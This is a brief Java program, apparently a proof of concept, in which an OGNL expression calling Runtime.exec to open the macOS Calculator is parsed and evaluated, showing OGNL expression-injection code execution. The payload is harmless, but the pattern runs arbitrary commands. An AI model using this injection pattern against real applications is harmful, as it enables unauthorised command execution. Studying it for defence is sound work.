package Action;

import ognl.Ognl;
import ognl.OgnlContext;

public class ognlExpr {
    public static void main(String[] args) throws Exception{
        String str = "('#myret=@java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla)";
        OgnlContext context = new OgnlContext();
        Object ognl = Ognl.parseExpression(str);
        Object value = Ognl.getValue(ognl,context,context.getRoot());
        System.out.print("result："+value);
    }
}
